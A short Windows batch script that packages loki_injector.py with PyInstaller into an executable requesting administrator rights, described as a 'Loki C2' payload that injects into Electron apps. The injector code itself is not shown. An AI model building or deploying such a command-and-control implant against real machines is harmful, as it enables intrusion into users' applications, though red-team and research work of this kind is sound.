@echo off
REM Build Loki C2 Windows Payload on Windows

echo Building Loki C2 Windows Payload...
echo ====================================
echo.

REM Check Python
python --version >nul 2>&1
if errorlevel 1 (
    echo [!] Python not found. Please install Python 3.x
    pause
    exit /b 1
)

REM Install PyInstaller
echo [*] Installing PyInstaller...
pip install pyinstaller

REM Build executable
echo [*] Building Windows executable...
pyinstaller --onefile ^
    --name loki_injector ^
    --console ^
    --uac-admin ^
    --clean ^
    loki_injector.py

echo.
echo ====================================
echo BUILD COMPLETE
echo ====================================
echo.
echo Executable: dist\loki_injector.exe
echo.
echo Run as Administrator to inject Electron apps
echo.
pause
